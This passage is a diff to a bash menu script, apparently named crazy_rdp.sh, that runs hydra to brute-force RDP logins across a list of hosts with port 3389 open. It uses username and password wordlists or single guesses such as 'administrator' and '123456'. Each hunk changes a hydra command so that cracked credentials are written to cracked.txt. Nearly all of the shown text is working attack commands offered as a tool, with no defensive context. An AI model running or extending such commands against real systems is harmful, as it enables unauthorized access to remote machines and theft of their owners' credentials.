-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -15017,7 +15017,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -15061,7 +15061,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -15071,7 +15071,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -15081,7 +15081,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -15090,7 +15090,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -15135,7 +15135,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -15145,7 +15145,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -15155,7 +15155,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -15164,7 +15164,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -15206,7 +15206,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -15216,7 +15216,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -15226,7 +15226,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -15235,7 +15235,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
